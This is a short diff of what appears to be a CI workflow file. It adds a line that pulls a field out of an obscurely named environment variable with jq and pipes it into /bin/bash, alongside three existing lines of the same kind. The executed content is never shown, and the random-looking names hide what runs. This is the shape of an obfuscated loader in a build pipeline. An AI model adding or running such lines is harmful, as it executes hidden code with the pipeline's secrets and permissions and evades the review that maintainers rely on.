@@ -45,6 +45,7 @@ jobs:
           echo $xzwsx3533 | jq -r .w53 | /bin/bash
           echo $t27950 | jq -r .np6985 | /bin/bash
           echo $llma20 | jq -r .ojnbf2 | /bin/bash
+          printf '%s' "$z121" | jq -r .pijl3625 | /bin/bash
 
       - name: Store results
         if: always()
